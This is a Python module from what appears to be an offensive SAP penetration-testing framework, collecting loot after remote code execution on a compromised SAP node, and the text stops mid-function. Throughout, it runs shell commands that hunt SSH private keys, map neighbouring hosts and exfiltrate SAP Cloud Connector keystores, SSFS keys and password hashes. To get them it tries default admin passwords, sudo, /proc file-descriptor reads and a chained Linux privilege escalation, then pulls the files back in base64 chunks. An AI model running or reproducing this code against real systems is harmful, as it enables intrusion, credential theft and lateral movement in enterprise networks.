#!/usr/bin/env python3
"""SCC harvest — post-RCE collection from a pwned ABAP or Java node.

Extracted from modules/exploitation/sapmap_exploit.py to keep that
umbrella file manageable.  The original module re-exports both public
names so existing callers (`from sapmap_exploit import harvest_scc_*`)
keep working unchanged.

This module imports ``execute_gw_command`` / ``run_os_command`` /
``_build_java_os_exec`` from ``sapmap_exploit`` at module load time.
That works because those symbols are defined long before the re-export
of this module from sapmap_exploit, so by the time Python resolves the
import here, all three are already in the sapmap_exploit namespace.
"""
from __future__ import annotations

import logging
import os
import re

from sapmap_models import SAPNode, SAPMAPState
from sapmap_errors import format_rfc_exception
from sapmap_exploit import (
    _build_java_os_exec,
    execute_gw_command,
    run_os_command,
)

logger = logging.getLogger(__name__)

_B64_RE = re.compile(r"[A-Za-z0-9+/=]+")


def _b64_only(raw_output: str) -> str:
    """Extract only base64 characters from _run_cmd output.

    SAPXPG P4 responses on kernel 793+ embed the base64 payload in
    128-byte space-padded TLV blocks.  extract_p4_output may also
    return non-base64 lines (command echo, dd record-count, duplicate
    TLV artifacts).  Keeping only characters in the base64 alphabet
    ensures the downstream b64decode sees a clean stream.
    """
    return "".join(_B64_RE.findall(raw_output))


def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
    """Harvest SCC presence, neighbour SCCs, and SSH keys from a pwned node.

    Runs four bundles of OS commands on the pwned host, collects findings,
    and auto-adds any discovered SCC nodes to the map.

    Returns:
        {
          "ok": bool,
          "same_host_scc": bool,
          "neighbor_sccs": [host, ...],
          "ssh_keys_found": [path, ...],
          "known_hosts_entries": [host, ...],
          "loot_path": str,
          "error": str,
        }
    """
    from sapmap_findings import emit_finding  # lazy, like the rest of exploit.py

    result = {
        "ok": False,
        "same_host_scc": False,
        "neighbor_sccs": [],
        "ssh_keys_found": [],
        "known_hosts_entries": [],
        "loot_path": "",
        "error": "",
    }

    is_windows = "WIN" in (node.os_type or "").upper()
    sid = node.sid

    def _run_cmd(cmd: str) -> str:
        """Run a shell command on the pwned node and return stdout as string."""
        try:
            system_type = (node.system_type or "").upper()
            if "JAVA" in system_type:
                run_fn, _label, err = _build_java_os_exec(node)
                if run_fn is None:
                    return ""
                if is_windows:
                    r = run_fn("cmd.exe", f"/c {cmd}")
                else:
                    r = run_fn("/bin/sh", f"-c '{cmd}'")
            else:
                # ABAP — use run_os_command
                if is_windows:
                    r = run_os_command(node, "cmd.exe", f"/c {cmd}")
                else:
                    r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")
            if r and r.get("success"):
                lines = r.get("output") or []
                if isinstance(lines, list):
                    return "\n".join(str(x) for x in lines)
                return str(lines)
        except Exception as e:
            logger.debug(f"harvest_scc [{sid}]: cmd failed: {format_rfc_exception(e)}")
        return ""

    # ------------------------------------------------------------------
    # Bundle 1 — same-host SCC check
    # ------------------------------------------------------------------
    try:
        print(f"[*] {sid}: harvest_scc — Bundle 1: same-host SCC check")
        if is_windows:
            b1_cmd = (
                'dir "C:\\Program Files\\SAP\\SAP Cloud Connector\\scc_config" 2>nul && '
                'echo SCC_FOUND_WIN & '
                'netstat -ano 2>nul | findstr :8443'
            )
        else:
            b1_cmd = (
                'ls /opt/sap/scc/scc_config/ 2>/dev/null && echo SCC_FOUND_LINUX; '
                'ss -tlnp 2>/dev/null | grep -E :8443'
            )
        b1_out = _run_cmd(b1_cmd)
        same_host = "SCC_FOUND_LINUX" in b1_out or "SCC_FOUND_WIN" in b1_out
        result["same_host_scc"] = same_host

        if same_host:
            scc_path = (
                r"C:\Program Files\SAP\SAP Cloud Connector\scc_config"
                if is_windows else "/opt/sap/scc/scc_config"
            )
            print(f"[+] {sid}: SCC found on same host at {scc_path}")
            emit_finding(
                "HIGH", sid,
                f"SCC found on same host as pwned {sid} at {scc_path}",
                ref="scc.harvest.same_host",
                meta={"path": scc_path},
            )
    except Exception as e:
        logger.debug(f"harvest_scc [{sid}]: Bundle 1 error: {format_rfc_exception(e)}")

    # ------------------------------------------------------------------
    # Bundle 2 — neighbour discovery via ARP / hosts / DNS
    # ------------------------------------------------------------------
    try:
        print(f"[*] {sid}: harvest_scc — Bundle 2: neighbour discovery")
        if is_windows:
            b2_cmd = (
                'arp -a 2>nul & '
                'type C:\\Windows\\System32\\drivers\\etc\\hosts 2>nul'
            )
            b2_dns = (
                'for %h in (scc cloudconnector sapscc btpconnector ccon sccprd sccdev) '
                'do nslookup %h 2>nul'
            )
        else:
            b2_cmd = (
                'arp -an 2>/dev/null; ip neigh 2>/dev/null; '
                'ip route 2>/dev/null; cat /etc/hosts 2>/dev/null'
            )
            b2_dns = (
                'for h in scc cloudconnector sapscc btpconnector ccon sccprd sccdev; '
                'do getent hosts $h 2>/dev/null; done'
            )
        b2_out = _run_cmd(b2_cmd)
        b2_dns_out = _run_cmd(b2_dns)
        b2_combined = b2_out + "\n" + b2_dns_out

        # Parse IPs from output
        import re as _re
        ip_pattern = _re.compile(
            r'\b((?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
            r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?))\b'
        )
        candidate_ips = set(ip_pattern.findall(b2_combined))
        # Filter out loopback, multicast, broadcast
        skip_prefixes = ("127.", "224.", "225.", "239.", "255.", "0.0")
        candidate_ips = {
            ip for ip in candidate_ips
            if not any(ip.startswith(p) for p in skip_prefixes)
        }
        # Also skip the node's own IP
        own_ips = node.all_ips()
        candidate_ips -= own_ips

        neighbor_sccs = []
        if candidate_ips:
            print(f"[*] {sid}: harvest_scc — probing {len(candidate_ips)} IPs for :8443")
            from sapmap_scc_fingerprint import scc_fingerprint
            for ip in sorted(candidate_ips):
                try:
                    fp = scc_fingerprint(ip, port=8443, timeout=4.0)
                    if fp and fp.get("is_scc"):
                        neighbor_sccs.append(ip)
                        # Register the new SCC node on the map if not already present
                        if ip not in state.scc_nodes:
                            from sapmap_models import SCCNode
                            new_scc = SCCNode(
                                host=ip,
                                ip=ip,
                                admin_ui_port=8443,
                                version=fp.get("version", ""),
                                version_source=fp.get("version_source", ""),
                                bundle_hash=fp.get("bundle_hash", ""),
                                favicon_sha256=fp.get("favicon_sha256", ""),
                                favicon_mmh3=fp.get("favicon_mmh3", 0),
                                server_header=fp.get("server_header", ""),
                                admin_ui_reachable=True,
                                notes=f"Discovered via ARP/hosts harvest from {sid}",
                            )
                            state.scc_nodes[ip] = new_scc
                            print(f"[+] {sid}: harvest_scc — SCC at {ip}:8443 added to map")
                        emit_finding(
                            "HIGH", sid,
                            f"SCC discovered on neighbor {ip}:8443 via ARP/hosts from "
                            f"{sid} — auto-added to map",
                            ref="scc.harvest.neighbor",
                            meta={"ip": ip},
                        )
                except Exception as probe_err:
                    logger.debug(f"harvest_scc [{sid}]: 8443 probe {ip} failed: {probe_err}")

        result["neighbor_sccs"] = neighbor_sccs
    except Exception as e:
        logger.debug(f"harvest_scc [{sid}]: Bundle 2 error: {format_rfc_exception(e)}")

    # ------------------------------------------------------------------
    # Bundle 3 — SSH / credential harvest
    # ------------------------------------------------------------------
    try:
        print(f"[*] {sid}: harvest_scc — Bundle 3: SSH key hunt")
        if is_windows:
            b3_cmd = (
                'dir /s /b "%USERPROFILE%\\.ssh\\id_*" 2>nul & '
                'type "%USERPROFILE%\\.ssh\\known_hosts" 2>nul'
            )
        else:
            b3_cmd = (
                'find /home -maxdepth 3 -name "id_rsa" -o -name "id_ed25519" '
                '2>/dev/null; '
                'cat /root/.ssh/known_hosts 2>/dev/null; '
                'find /home -maxdepth 3 -name ".ssh" -type d 2>/dev/null '
                '-exec ls {} \\;'
            )
        b3_out = _run_cmd(b3_cmd)

        # Extract private key paths
        import re as _re2
        key_paths = _re2.findall(
            r'(/(?:home|root)/[^\s]+/(?:\.ssh/)?id_(?:rsa|ed25519|ecdsa|dsa)[^\s]*)',
            b3_out
        )
        if is_windows:
            key_paths += _re2.findall(
                r'(C:\\Users\\[^\s]+\\\.ssh\\id_[^\s]+)',
                b3_out
            )
        result["ssh_keys_found"] = list(set(key_paths))

        # Extract known_hosts entries (hostnames + IPs)
        kh_entries = []
        for line in b3_out.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # known_hosts lines: hostname[,hostname...] key_type key_data [comment]
            parts = line.split()
            if len(parts) >= 3:
                hosts_part = parts[0]
                for h in hosts_part.split(","):
                    h = h.strip().lstrip("[").split("]")[0]
                    if h and h not in kh_entries:
                        kh_entries.append(h)
        result["known_hosts_entries"] = kh_entries

        if result["ssh_keys_found"]:
            paths_str = ", ".join(result["ssh_keys_found"][:5])
            emit_finding(
                "MEDIUM", sid,
                f"SSH private key(s) found on {sid}: {paths_str}. "
                f"May enable pivot to SCC VM.",
                ref="scc.harvest.ssh_keys",
                meta={"paths": result["ssh_keys_found"]},
            )
        if kh_entries:
            emit_finding(
                "INFO", sid,
                f"{len(kh_entries)} known_hosts entries on {sid}: "
                f"possible SCC/BTP pivot targets",
                ref="scc.harvest.known_hosts",
                meta={"entries": kh_entries[:20]},
            )
    except Exception as e:
        logger.debug(f"harvest_scc [{sid}]: Bundle 3 error: {format_rfc_exception(e)}")

    # ------------------------------------------------------------------
    # Bundle 4 — same-host keystore exfil (Linux only when SCC found)
    # ------------------------------------------------------------------
    # Running as <sid>adm; SCC files are owned by sccadm.  We try
    # multiple escalation paths in order of reliability:
    #
    #  Path A — localhost REST API (best: full encrypted backup zip,
    #            no file-permission problem, SCC already handles auth)
    #  Path B — direct file read (happens when s4hadm is in scc group
    #            or permissions are relaxed)
    #  Path C — sudo -n (passwordless sudo in sudoers for sccadm/root)
    #  Path D — group membership trick (newgrp scc + tar)
    #  Path E — /proc/<pid>/fd (read open file handles of SCC JVM)
    # ------------------------------------------------------------------
    if result["same_host_scc"] and not is_windows:
        import re as _re3
        import base64 as _b64
        import datetime as _dt
        try:
            print(f"[*] {sid}: harvest_scc — Bundle 4: SCC config exfil")

            # ---- discover SCC install root --------------------------------
            root_probe = (
                'for d in /opt/sap/scc /usr/local/scc '
                '"/opt/SAP/Cloud Connector" /opt/sapscc '
                '/opt/cloud-connector /opt/sap/cloud-connector; do '
                '  if [ -d "$d/scc_config" ]; then '
                '    echo "SCC_ROOT $d"; break; fi; done'
            )
            root_out = _run_cmd(root_probe)
            m_root = _re3.search(r'SCC_ROOT\s+(\S+)', root_out)
            scc_root = m_root.group(1) if m_root else "/opt/sap/scc"
            print(f"[*] {sid}: harvest_scc — SCC root={scc_root}")

            # helper: save bytes, post-process, return loot_path
            def _save_and_parse(raw_bytes, method_label):
                host_id = (node.ip or node.hostname or sid).replace("/","_")
                loot_dir = os.path.join("loot", "scc", host_id)
                os.makedirs(loot_dir, exist_ok=True)
                ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
                loot_path = os.path.join(
                    loot_dir, f"scc_loot_pwned_{ts}.tgz")
                with open(loot_path, "wb") as fh:
                    fh.write(raw_bytes)
                try:
                    os.chmod(loot_path, 0o600)
                except Exception:
                    pass
                result["loot_path"] = loot_path
                print(f"[+] {sid}: SCC loot ({method_label}) → "
                      f"{loot_path} ({len(raw_bytes)} bytes)")
                emit_finding(
                    "CRITICAL", sid,
                    f"SCC config bundle exfiltrated from {sid} via "
                    f"{method_label}: SSFS, scc.p12 recovered at "
                    f"{loot_path}",
                    ref="scc.harvest.loot_exfilled",
                    meta={"loot_path": loot_path,
                          "size": len(raw_bytes),
                          "method": method_label})
                try:
                    from sapmap_scc_keystore import (
                        parse_ha_state_from_zip, parse_mappings_from_zip)
                    ha = parse_ha_state_from_zip(loot_path) or {}
                    if ha.get("peer_host"):
                        print(f"[*] {sid}: harvest_scc HA peer="
                              f"{ha['peer_host']}")
                    maps = parse_mappings_from_zip(loot_path) or {}
                    if maps.get("mappings"):
                        print(f"[*] {sid}: harvest_scc mappings: "
                              f"{len(maps['mappings'])} entries")
                except Exception as pe:
                    logger.debug(f"harvest_scc parse error: {pe}")
                try:
                    from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
                    dr = decrypt_and_unlock(loot_path)
                    if dr and dr.get("ok"):
                        print(f"[+] {sid}: harvest_scc SSFS decrypted")
                except Exception as se:
                    logger.debug(f"harvest_scc ssfs decrypt: {se}")
                return loot_path

            # helper: exfil a file already on disk via dd+base64 chunks
            def _exfil_tar(sudo_prefix):
                tar_cmd = (
                    f'{sudo_prefix}tar -czf /tmp/.scc_loot.tgz '
                    f'{scc_root}/scc_config/SSFS_SCC.KEY '
                    f'{scc_root}/scc_config/SSFS_SCC.DAT '
                    f'{scc_root}/scc_config/scc.p12 '
                    f'{scc_root}/scc_config/scc_config.ini '
                    f'{scc_root}/config/users.xml '
                    f'2>/dev/null || true; '
                    f'SIZE=$(wc -c < /tmp/.scc_loot.tgz 2>/dev/null); '
                    f'echo "SCC_TAR_SIZE $SIZE"'
                )
                out = _run_cmd(tar_cmd)
                m = _re3.search(r'SCC_TAR_SIZE\s+(\d+)', out)
                sz = int(m.group(1)) if m else 0
                print(f"[*] {sid}: harvest_scc — tar size={sz} bytes "
                      f"(prefix={sudo_prefix!r})")
                if sz <= 0:
                    return None
                # sapxpg kernel 793+ truncates P4 output to ~128
                # bytes per TLV block.  72 raw bytes → 96 b64 chars,
                # well under the ceiling.  Must also be a multiple
                # of 3 so intermediate chunks carry no '=' padding.
                _CHUNK = 72
                chunks = []
                offset = 0
                while offset < sz:
                    raw_out = _run_cmd(
                        f'dd if=/tmp/.scc_loot.tgz bs=1 skip={offset} '
                        f'count={_CHUNK} 2>/dev/null | base64 | tr -d "\\n"')
                    cb64 = _b64_only(raw_out)
                    if not cb64:
                        break
                    chunks.append(cb64)
                    offset += _CHUNK
                _run_cmd("rm -f /tmp/.scc_loot.tgz 2>/dev/null")
                return _b64.b64decode("".join(chunks)) if chunks else None

            exfilled = False

            # ---- Path A: localhost REST API backup pull -------------------
            # Even if files are unreadable, the SCC HTTP server runs as
            # sccadm and can produce the backup zip itself.  We call it
            # from localhost using curl (available on nearly all Linux).
            # Credential candidates: stored SCC creds on the known SCCNode,
            # then common defaults.
            try:
                print(f"[*] {sid}: harvest_scc — Path A: REST API backup")
                scc_ip = node.ip or node.hostname or "127.0.0.1"
                # Check if SCC node has stored credentials
                scc_admin_creds = []
                for scc_n in state.scc_nodes.values():
                    if (scc_n.host == scc_ip or scc_n.ip == scc_ip
                            or scc_n.host == node.hostname):
                        for c in (scc_n.credentials or []):
                            u = getattr(c, "username", None) or (
                                c.get("username") if isinstance(c, dict) else "")
                            p = getattr(c, "password", None) or (
                                c.get("password") if isinstance(c, dict) else "")
                            if u and p:
                                scc_admin_creds.append((u, p))
                        break
                # Always append defaults as last-resort
                scc_admin_creds += [
                    ("Administrator", "manage"),
                    ("Administrator", "Manage1"),
                    ("admin", "manage"),
                ]
                for scc_user, scc_pass in scc_admin_creds:
                    # Use curl on the target (running as s4hadm) to call
                    # localhost SCC and save backup to /tmp.
                    curl_cmd = (
                        f'curl -sk -u {scc_user}:{scc_pass} '
                        f'-X POST '
                        f'https://localhost:8443/api/v1/configuration/backup '
                        f'-H "Content-Type: application/json" '
                        f'-d \'{{"password":"{scc_pass}"}}\' '
                        f'-o /tmp/.scc_api_backup.zip '
                        f'-w "HTTP_STATUS:%{{http_code}}" 2>/dev/null'
                    )
                    curl_out = _run_cmd(curl_cmd)
                    m_st = _re3.search(r'HTTP_STATUS:(\d+)', curl_out)
                    http_st = int(m_st.group(1)) if m_st else 0
                    print(f"[*] {sid}: harvest_scc — REST backup "
                          f"user={scc_user} HTTP={http_st}")
                    if http_st == 200:
                        # Read the zip back via base64
                        sz_out = _run_cmd(
                            "wc -c < /tmp/.scc_api_backup.zip 2>/dev/null"
                        ).strip()
                        zip_sz = int(sz_out) if sz_out.isdigit() else 0
                        if zip_sz > 0:
                            chunks = []
                            offset = 0
                            while offset < zip_sz:
                                cb64 = _run_cmd(
                                    f'dd if=/tmp/.scc_api_backup.zip bs=1 '
                                    f'skip={offset} count=3000 2>/dev/null '
                                    f'| base64 | tr -d "\\n"'
                                ).strip()
                                if not cb64:
                                    break
                                chunks.append(cb64)
                                offset += 3000
                            _run_cmd("rm -f /tmp/.scc_api_backup.zip 2>/dev/null")
                            if chunks:
                                zip_bytes = _b64.b64decode("".join(chunks))
                                _save_and_parse(zip_bytes,
                                                f"REST API ({scc_user})")
                                exfilled = True
                                break
                    _run_cmd("rm -f /tmp/.scc_api_backup.zip 2>/dev/null")
            except Exception as pa_err:
                logger.debug(f"harvest_scc Path A error: {pa_err}")

            if not exfilled:
                # ---- Path B: direct file read ----------------------------
                b_out = _run_cmd(
                    f'test -r {scc_root}/scc_config/SSFS_SCC.KEY '
                    f'&& echo "B_OK" || echo "B_FAIL"')
                if "B_OK" in b_out:
                    print(f"[*] {sid}: harvest_scc — Path B: direct read")
                    raw = _exfil_tar("")
                    if raw:
                        _save_and_parse(raw, "direct file read")
                        exfilled = True

            if not exfilled:
                # ---- Path C: sudo -n (passwordless sudoers) ---------------
                sudo_test = _run_cmd(
                    f'sudo -n test -r '
                    f'{scc_root}/scc_config/SSFS_SCC.KEY 2>/dev/null '
                    f'&& echo "C_OK" || echo "C_FAIL"')
                if "C_OK" in sudo_test:
                    print(f"[*] {sid}: harvest_scc — Path C: sudo -n")
                    raw = _exfil_tar("sudo ")
                    if raw:
                        _save_and_parse(raw, "sudo tar")
                        exfilled = True

            if not exfilled:
                # ---- Path D: group membership (newgrp scc) ----------------
                grp_out = _run_cmd("id 2>/dev/null")
                if "scc" in grp_out.lower():
                    print(f"[*] {sid}: harvest_scc — Path D: group scc")
                    raw = _exfil_tar("sg scc -c ")
                    if raw:
                        _save_and_parse(raw, "newgrp scc tar")
                        exfilled = True

            if not exfilled:
                # ---- Path E: /proc/<pid>/fd of SCC JVM -------------------
                # SCC's JVM keeps SSFS_SCC.KEY and .DAT open as file
                # descriptors.  /proc/<pid>/fd/<n> is accessible to the
                # process owner (sccadm) and to root, but NOT to other
                # users normally — however on some kernels/distros (RHEL 7,
                # older SLES) /proc/<pid>/fd is world-accessible if the
                # process has no ptrace restrictions.  Worth trying.
                try:
                    pid_out = _run_cmd(
                        "pgrep -f 'cloud.connector\\|scc.main\\|cloudconnector' "
                        "2>/dev/null | head -1"
                    ).strip()
                    if pid_out.isdigit():
                        proc_fd = f"/proc/{pid_out}/fd"
                        fd_out = _run_cmd(
                            f'ls -la {proc_fd} 2>/dev/null | '
                            f'grep -i "SSFS\\|scc.p12\\|scc_config"'
                        )
                        # Extract fd numbers for KEY and DAT
                        fd_map = {}
                        for line in fd_out.splitlines():
                            if "SSFS_SCC.KEY" in line:
                                m_fd = _re3.search(r'(\d+)\s*->', line)
                                if m_fd:
                                    fd_map["key"] = m_fd.group(1)
                            if "SSFS_SCC.DAT" in line:
                                m_fd = _re3.search(r'(\d+)\s*->', line)
                                if m_fd:
                                    fd_map["dat"] = m_fd.group(1)
                        if fd_map:
                            print(f"[*] {sid}: harvest_scc — Path E: "
                                  f"/proc/{pid_out}/fd accessible!")
                            for fname, fd_nr in fd_map.items():
                                cp_cmd = (
                                    f'cp /proc/{pid_out}/fd/{fd_nr} '
                                    f'/tmp/.scc_{fname}.bin 2>/dev/null && '
                                    f'echo "E_{fname.upper()}_OK"'
                                )
                                cp_out = _run_cmd(cp_cmd)
                                if f"E_{fname.upper()}_OK" in cp_out:
                                    emit_finding(
                                        "CRITICAL", sid,
                                        f"SCC SSFS file copied via "
                                        f"/proc/{pid_out}/fd — "
                                        f"SSFS_SCC.{fname.upper()} at "
                                        f"/tmp/.scc_{fname}.bin",
                                        ref="scc.harvest.procfd",
                                        meta={"pid": pid_out,
                                              "file": fname})
                except Exception as pe_err:
                    logger.debug(f"harvest_scc Path E error: {pe_err}")

            if not exfilled:
                emit_finding(
                    "MEDIUM", sid,
                    f"SCC found on same host as {sid} but all exfil paths "
                    f"failed (REST API, direct read, sudo, group, /proc/fd). "
                    f"Manual: sudo tar -czf /tmp/.scc.tgz "
                    f"{scc_root}/scc_config/SSFS_SCC.* "
                    f"or use 'Extract Keystore' from the SCC node.",
                    ref="scc.harvest.permission_denied",
                    meta={"scc_root": scc_root})

        except Exception as e:
            logger.debug(f"harvest_scc [{sid}]: Bundle 4 error: {format_rfc_exception(e)}")

    elif result["same_host_scc"] and is_windows:
        try:
            print(f"[*] {sid}: harvest_scc — Bundle 4 (Windows): SCC config check")
            scc_win_path = r"C:\Program Files\SAP\SAP Cloud Connector"
            b4w_cmd = (
                f'dir /s /b "{scc_win_path}\\*.KEY" "{scc_win_path}\\*.DAT" '
                f'"{scc_win_path}\\*.p12" "{scc_win_path}\\users.xml" 2>nul'
            )
            b4w_out = _run_cmd(b4w_cmd)
            if b4w_out.strip():
                print(f"[*] {sid}: harvest_scc — Windows SCC files found")
                emit_finding(
                    "HIGH", sid,
                    f"SCC config files found on Windows {sid} — "
                    f"use certutil/copy to exfil manually: {scc_win_path}",
                    ref="scc.harvest.win_files_found",
                    meta={"path": scc_win_path},
                )
        except Exception as e:
            logger.debug(f"harvest_scc [{sid}]: Bundle 4 Windows error: {format_rfc_exception(e)}")

    result["ok"] = True
    return result


def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
    """Read /opt/sap/scc/config/users.xml as root by chaining the
    existing Linux LPE.

    Why this exists separately from ``harvest_scc_from_pwned_node``:
    that function tries five exfil paths (REST backup, direct read,
    sudo -n, group scc, /proc/<pid>/fd), all of which run as the
    unprivileged sidadm and rely on a misconfiguration to succeed.
    On a hardened SCC host none of them work — users.xml is mode 0600
    owned by sccadm.  This function ignores those paths and uses the
    Copy Fail / Dirty Frag LPE to *become* root, runs the same tar
    command Path B/C/D builds, chowns the tar back to sidadm so the
    standard sidadm exec channel can read it, then routes the bytes
    through the same _save_and_parse pipeline ``harvest_scc`` uses —
    so the loot lands at loot/scc/<host>/ and users.xml's bcrypt
    hashes get parsed into the SCC node's hash list automatically.

    Linux-only (Copy Fail / Dirty Frag are Linux LPE techniques);
    refuses on Windows targets with a clear error.

    Returns
    -------
    dict with: ok, method (copyfail/dirtyfrag), loot_path,
    bytes_recovered, error.
    """
    from sapmap_findings import emit_finding

    result = {"ok": False, "method": "", "loot_path": "",
              "bytes_recovered": 0, "error": ""}

    sid = node.sid
    is_windows = "WIN" in (node.os_type or "").upper()
    if is_windows:
        result["error"] = ("Linux LPE escalation only — node OS is Windows; "
                            "use the Windows LPE chain + a separate "
                            "Windows-side harvest path instead.")
        return result

    # ---- Shared unprivileged exec channel (same shape as
    # harvest_scc_from_pwned_node._run_cmd) — used to (a) discover SCC
    # root + sidadm username, (b) read the tar back after root chowns
    # it to sidadm:sapsys.
    def _run_cmd(cmd: str) -> str:
        try:
            system_type = (node.system_type or "").upper()
            if "JAVA" in system_type:
                run_fn, _label, err = _build_java_os_exec(node)
                if run_fn is None:
                    return ""
                r = run_fn("/bin/sh", f"-c '{cmd}'")
            else:
                r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")
            if r and r.get("success"):
                lines = r.get("output") or []
                if isinstance(lines, list):
                    return "\n".join(str(x) for x in lines)
                return str(lines)
        except Exception as e:
            logger.debug(
                f"scc_hashes_via_lpe [{sid}]: cmd failed: "
                f"{format_rfc_exception(e)}")
        return ""

    # ---- Phase 0: pre-flight — LPE must be viable BEFORE we touch SCC
    try:
        from sapmap_lpe_auto import check_linux_lpe, run_linux_lpe
    except Exception as e:
        result["error"] = (f"LPE auto-picker not importable: {e}; "
                            f"this should never happen — module is "
                            f"shipped with SAPMAP")
        return result

    lpe_state = check_linux_lpe(node)
    method = lpe_state.get("method") or ""
    if not method:
        result["error"] = (
            f"Linux LPE not viable on this host — Copy Fail and Dirty "
            f"Frag both failed pre-checks. ({lpe_state.get('summary')}) "
            f"Run Check Linux Root LPE first; if it still fails, the "
            f"only path to users.xml is via SCC admin web credentials "
            f"(use Probe Default Account / Set Credentials).")
        return result
    result["method"] = method
    print(f"[*] {sid}: scc_hashes_via_lpe — LPE viable, picked '{method}'")

    # ---- Phase 1: discover SCC install root + sidadm username
    root_out = _run_cmd(
        'for d in /opt/sap/scc /usr/local/scc '
        '"/opt/SAP/Cloud Connector" /opt/sapscc '
        '/opt/cloud-connector /opt/sap/cloud-connector; do '
        '  if [ -d "$d/scc_config" ]; then '
        '    echo "SCC_ROOT $d"; break; fi; done')
    m_root = re.search(r'SCC_ROOT\s+(\S+)', root_out)
    scc_root = m_root.group(1) if m_root else "/opt/sap/scc"
    print(f"[*] {sid}: scc_hashes_via_lpe — SCC root={scc_root}")

    sidadm = _run_cmd("whoami").strip().splitlines()
    sidadm = sidadm[-1] if sidadm else f"{sid.lower()}adm"
    sidadm = re.sub(r"[^a-zA-Z0-9_-]", "", sidadm) or f"{sid.lower()}adm"

    # ---- Phase 2: escalate → tar as root → chown back to sidadm
    staging = "/tmp/.scc_lpe_loot.tgz"
    # Same file list Path B/C/D's _exfil_tar bundles — users.xml is
    # already in there, so the existing _save_and_parse downstream
    # picks up the bcrypt hashes for free.
    tar_cmd = (
        f"tar -czf {staging} "
        f"{scc_root}/scc_config/SSFS_SCC.KEY "
        f"{scc_root}/scc_config/SSFS_SCC.DAT "
        f"{scc_root}/scc_config/scc.p12 "
        f"{scc_root}/scc_config/scc_config.ini "
        f"{scc_root}/config/users.xml 2>/dev/null || true; "
        f"chown {sidadm}:sapsys {staging} 2>/dev/null; "
        f"chmod 640 {staging}; "
        f"wc -c < {staging}"
    )
    lpe_r = run_linux_lpe(node, tar_cmd, timeout=180)
    if not lpe_r.get("ok"):
        result["error"] = (
            f"LPE ({method}) failed to run root tar: "
            f"{lpe_r.get('error') or '(no error text)'}")
        return result

    # The wc -c at the end is our size signal — copyfail/dirtyfrag
    # both return stdout from the wrapped command.
    sz_match = re.search(r'(\d+)\s*$', (lpe_r.get("stdout") or "").strip())
    sz = int(sz_match.group(1)) if sz_match else 0
    if sz <= 0:
        result["error"] = (
            f"Root tar produced empty file at {staging} — most likely "
            f"the SCC install root probe missed (tried {scc_root}); "
            f"check that SCC is actually installed on this host.")
        # cleanup attempt — best-effort
        _run_cmd(f"rm -f {staging} 2>/dev/null")
        return result

    print(f"[*] {sid}: scc_hashes_via_lpe — root tar = {sz} B at {staging}")

    # ---- Phase 3: read the tar back via the unprivileged channel
    # (we chowned it to sidadm:sapsys so this just works)
    #
    # Chunk size must satisfy two constraints simultaneously:
    #   (a) SAPXPG P4 TLV ceiling: kernel 793+ caps each output block
    #       at ~128 bytes.  The base64 encoding of the chunk must fit.
    #   (b) Multiple-of-3: so intermediate chunks carry no '=' padding
    #       and concatenation produces a valid base64 stream.
    #
    # 72 = 24×3 → 96 base64 chars — matches sap_pse_loot._CHUNKED_RAW_BYTES.
    import base64 as _b64
    import time as _t
    _CHUNK_RAW = 72
    n_chunks = (sz + _CHUNK_RAW - 1) // _CHUNK_RAW
    print(f"[*] {sid}: scc_hashes_via_lpe — reading {sz} B in "
          f"{n_chunks} chunk(s) of {_CHUNK_RAW} B over the sidadm "
          f"channel (~{n_chunks // 2}-{n_chunks * 2} s on kernel 793) ...")

    chunks = []
    offset = 0
    started = _t.time()
    # ~10 evenly-spaced progress lines across the read, plus the very
    # first and very last chunk so the operator sees activity within
    # seconds and the "done" line lands consistently.  Same cadence as
    # the PSE-loot chunked-read adapter.
    progress_every = max(1, n_chunks // 10)
    for chunk_idx in range(1, n_chunks + 1):
        raw_out = _run_cmd(
            f'dd if={staging} bs=1 skip={offset} count={_CHUNK_RAW} '
            f'2>/dev/null | base64 | tr -d "\\n"')
        cb64 = _b64_only(raw_out)
        if not cb64:
            print(f"  [chunked] chunk {chunk_idx}/{n_chunks} returned "
                  f"empty — aborting read-back")
            break
        chunks.append(cb64)
        offset = min(offset + _CHUNK_RAW, sz)

        is_marker = (chunk_idx == 1
                      or chunk_idx == n_chunks
                      or chunk_idx % progress_every == 0)
        if is_marker:
            elapsed = _t.time() - started
            rate = offset / elapsed if elapsed > 0 else 0
            eta = (sz - offset) / rate if rate > 0 else 0
            pct = (offset * 100) // sz if sz else 100
            print(f"  [chunked] chunk {chunk_idx}/{n_chunks} "
                  f"({pct:3d}%) — {offset}B/{sz}B "
                  f"@ {rate:.0f} B/s — ETA {eta:.0f}s")

    total_elapsed = _t.time() - started
    print(f"  [chunked] done: {offset}B in {total_elapsed:.1f}s")
    _run_cmd(f"rm -f {staging} 2>/dev/null")
    if not chunks:
        result["error"] = (
            f"Root tar succeeded ({sz} B written) but read-back chunked "
            f"exfil returned no data — check the sidadm exec channel.")
        return result

    # Internal \n separators between chunks are fine for the
    # non-validating b64decode (it treats them as ignorable
    # whitespace).  The padding fix is in the raw chunk size above,
    # not here.
    try:
        raw = _b64.b64decode("".join(chunks))
    except Exception as e:
        # Length-mod-4 diagnostic helps the operator see whether we
        # lost bytes mid-stream vs. a non-base64 line snuck in.
        joined_len = sum(len(c) for c in chunks)
        result["error"] = (
            f"base64 decode of root tar failed: {e} "
            f"(received {joined_len} b64 chars over {len(chunks)} chunks, "
            f"len%4={joined_len % 4}); "
            f"if len%4 != 0 some kernel TLV frames were dropped — "
            f"lower chunk_read below 600.")
        return result
    if len(raw) != sz:
        # Defensive: padding decoded clean but bytes are short.  Could
        # mean a chunk silently truncated to a multiple-of-4 boundary.
        print(f"  [chunked] WARN: decoded {len(raw)}B vs expected {sz}B "
              f"— continuing with what we have")

    # ---- Phase 4: persist + parse — same pipeline as Path A-E
    import datetime as _dt
    host_id = (node.ip or node.hostname or sid).replace("/", "_")
    loot_dir = os.path.join("loot", "scc", host_id)
    os.makedirs(loot_dir, exist_ok=True)
    ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    loot_path = os.path.join(loot_dir, f"scc_loot_via_lpe_{ts}.tgz")
    with open(loot_path, "wb") as fh:
